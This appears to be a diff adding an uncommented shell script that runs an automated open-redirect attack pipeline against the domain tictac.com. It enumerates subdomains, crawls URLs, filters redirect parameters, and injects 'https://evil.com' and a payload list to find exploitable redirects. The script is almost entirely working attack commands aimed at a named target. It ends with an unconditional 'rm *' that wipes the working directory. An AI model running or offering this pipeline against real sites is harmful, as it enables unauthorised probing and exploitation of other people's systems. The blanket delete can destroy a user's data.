@@ -1,0 +1,28 @@
+
+
+subfinder -d tictac.com -all -o subdomains1.txt & assetfinder --subs-only tictac.com > subdomains2.txt & wait
+
+
+
+
+sort -u subdomains1.txt subdomains2.txt -o uniqsubs.txt && httpx-toolkit -l uniqsubs.txt -o finallist.txt
+
+
+
+
+
+cat finallist.txt | gau --o urls1.txt & cat finallist.txt | katana -d 2 -o urls2.txt &  cat finallist.txt | urlfinder -o urls3.txt & cat finallist.txt | hakrawler > urls4.txt & wait
+
+
+
+cat urls1.txt urls2.txt urls3.txt urls4.txt | uro | sort -u | tee final.txt && cat final.txt | gf redirect | uro | sort -u | tee redirect_params.txt
+
+
+cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -status-code  -fr -mr "evil.com" 
+
+
+
+	
+cat redirect_params.txt | while read url; do cat /home/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -status-code -fr -mr "google.com"
+
+rm *
